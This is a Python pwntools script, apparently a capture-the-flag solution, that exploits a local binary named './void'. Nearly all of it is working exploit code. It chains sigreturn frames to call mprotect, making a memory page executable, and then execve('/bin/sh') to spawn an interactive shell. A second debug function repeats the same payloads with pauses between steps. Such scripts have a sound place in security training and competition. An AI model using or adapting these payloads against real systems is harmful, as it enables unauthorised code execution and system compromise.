#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-09-20 14:45:42
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "amd64"

filename = "./void"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    syscall_address = 0x401018
    mprotect_syscall_num = 0xa
    execve_syscall_number = 0x3b
    main_pointer = 0x4020b8
    main_address = binary_target.sym["main"]
    base_start = 0x402000
    bin_sh = b'/bin/sh\x00'

    mprotect_frame = SigreturnFrame()

    mprotect_frame.rip = syscall_address
    mprotect_frame.rsp = main_pointer
    mprotect_frame.rax = mprotect_syscall_num
    mprotect_frame.rdi = base_start
    mprotect_frame.rsi = 0x1000
    mprotect_frame.rdx = 0x7

    do_mprotect_payload = flat({
        0: [
            main_address,
            syscall_address,
            bytes(mprotect_frame)
        ]
    })

    execve_bin_sh_frame = SigreturnFrame()

    execve_bin_sh_frame.rip = syscall_address
    execve_bin_sh_frame.rsp = main_pointer
    execve_bin_sh_frame.rax = execve_syscall_number
    execve_bin_sh_frame.rdi = main_pointer + len(flat(execve_bin_sh_frame, main_address, syscall_address)) + 8
    execve_bin_sh_frame.rsi = 0
    execve_bin_sh_frame.rdx = 0

    do_execve_payload = flat({
        0: [
            main_address,
            syscall_address,
            bytes(execve_bin_sh_frame),
            bin_sh
        ]
    })

    my_send(do_mprotect_payload)
    my_send(do_mprotect_payload[8:8+15])
    my_send(do_execve_payload)
    my_send(do_execve_payload[8:8+15])

    target_process.interactive()


def debug():
    # gdb_script = """
    # break *main
    # """
    # gdb.attach(target_process, gdbscript=gdb_script)

    # syscall; ret
    syscall_address = 0x401018
    mprotect_syscall_num = 0xa
    execve_syscall_number = 0x3b
    main_pointer = 0x4020b8
    main_address = binary_target.sym["main"]
    base_start = 0x402000
    bin_sh = b'/bin/sh\x00'

    mprotect_frame = SigreturnFrame()

    mprotect_frame.rip = syscall_address
    mprotect_frame.rsp = main_pointer
    mprotect_frame.rax = mprotect_syscall_num
    mprotect_frame.rdi = base_start
    mprotect_frame.rsi = 0x1000
    mprotect_frame.rdx = 0x7

    do_mprotect_payload = flat({
        0: [
            main_address,
            syscall_address,
            bytes(mprotect_frame)
        ]
    })

    execve_bin_sh_frame = SigreturnFrame()

    execve_bin_sh_frame.rip = syscall_address
    execve_bin_sh_frame.rsp = main_pointer
    execve_bin_sh_frame.rax = execve_syscall_number
    execve_bin_sh_frame.rdi = main_pointer + len(flat(execve_bin_sh_frame, main_address, syscall_address)) + 8
    execve_bin_sh_frame.rsi = 0
    execve_bin_sh_frame.rdx = 0

    do_execve_payload = flat({
        0: [
            main_address,
            syscall_address,
            bytes(execve_bin_sh_frame),
            bin_sh
        ]
    })

    print("press enter to send the mprotect payload")
    pause()
    my_send(do_mprotect_payload)
    print("press enter to set rax to 15")
    pause()
    my_send(do_mprotect_payload[8:8+15])
    print("press enter to send the execve payload")
    pause()
    my_send(do_execve_payload)
    print("press enter to set rax to 15")
    pause()
    my_send(do_execve_payload[8:8+15])

    pause()

    target_process.interactive()


def my_send_line(data) -> None:
    target_process.sendline(data)


def my_send(data) -> None:
    target_process.send(data)


if __name__ == "__main__":
    # debug()
    exploit()


